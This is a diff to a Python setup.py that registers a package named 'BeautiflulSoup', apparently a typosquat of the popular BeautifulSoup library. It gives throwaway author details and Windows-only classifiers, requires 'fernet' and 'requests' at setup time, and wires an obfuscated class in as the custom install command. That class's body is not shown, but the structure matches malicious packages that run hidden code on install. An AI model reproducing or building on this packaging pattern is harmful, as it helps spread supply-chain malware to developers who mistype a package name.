@@ -18,5 +18,22 @@ class avhxDxzCoHscULSLouXdFPevHmdDAWJVtFJjbCcPbREYqLYvUPEnnjfZQSvvWzIRnoyUNgYHjY
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+setup(
+    name="BeautiflulSoup",
+    version=VERSION,
+    author="IAtELSMh",
+    author_email="oHwDy@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': avhxDxzCoHscULSLouXdFPevHmdDAWJVtFJjbCcPbREYqLYvUPEnnjfZQSvvWzIRnoyUNgYHjYCAEzuoexhlXgWSdHzteigEfGsCbNtfYDTgUvW,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
